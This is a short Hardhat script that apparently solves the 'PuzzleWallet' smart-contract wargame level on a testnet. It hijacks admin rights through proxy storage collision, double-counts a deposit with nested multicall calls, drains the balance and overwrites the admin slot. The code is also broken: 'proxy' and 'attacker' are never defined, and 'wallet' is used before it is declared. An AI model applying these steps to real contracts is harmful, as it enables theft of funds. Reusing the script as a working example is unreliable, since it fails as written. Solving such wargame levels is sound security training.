const { ethers } = require("hardhat")

async function main() {
    /*
    Script to pass the level on testnet (almost identical to test script)
    */

    const instance = "0xAd1BcF1cA472452Eeb90FE3437278840Db3642A0"
    const { deployer } = await ethers.getNamedSigners()

    // become owner
    await proxy.proposeNewAdmin(attacker.address)

    // whitelist self
    await wallet.addToWhitelist(attacker.address)

    // use multicall to deposit once but increase balances[attacker] twice
    const wallet = await ethers.getContractAt("PuzzleWallet", instance)
    const depositSignature = wallet.interface.encodeFunctionData("deposit")
    const multicallDepositSignature = wallet.interface.encodeFunctionData("multicall", [
        [depositSignature],
    ])
    await wallet.multicall([multicallDepositSignature, multicallDepositSignature], {
        value: ethers.utils.parseEther("0.001"),
    })

    // execute (withdraw)
    await wallet.execute(deployer.address, ethers.utils.parseEther("0.002"), "0x")

    // set admin to deployer using setMaxBalance
    const input = ethers.BigNumber.from(deployer.address)
    await wallet.setMaxBalance(input)
}

main()
